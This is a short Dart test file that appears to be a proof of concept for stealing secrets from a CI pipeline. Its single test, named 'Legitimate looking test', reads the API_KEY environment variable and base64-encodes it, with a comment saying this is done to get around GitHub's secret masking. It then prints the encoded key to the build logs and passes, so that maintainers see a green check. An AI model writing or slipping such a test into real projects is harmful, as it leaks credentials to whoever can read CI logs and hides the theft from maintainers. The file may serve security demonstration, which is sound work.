import 'dart:io';
import 'dart:convert';
import 'package:test/test.dart';

void main() {
  test('Legitimate looking test', () {
    // 1. The payload executes automatically when the CI runner calls `dart test`
    print("--- PIPELINE COMPROMISED ---");
    
    // 2. Steal the injected environment variable
    var stolenKey = Platform.environment['API_KEY'] ?? 'NO_KEY_FOUND';
    
    // 3. Base64 encode it to bypass GitHub's secret masking algorithm
    var exfiltratedData = base64.encode(utf8.encode(stolenKey));
    
    // 4. Print it to the logs
    print("Encoded Secret (Base64): $exfiltratedData");
    
    // 5. Pass the test so the maintainer sees a "Green Checkmark"
    expect(true, isTrue); 
  });
}
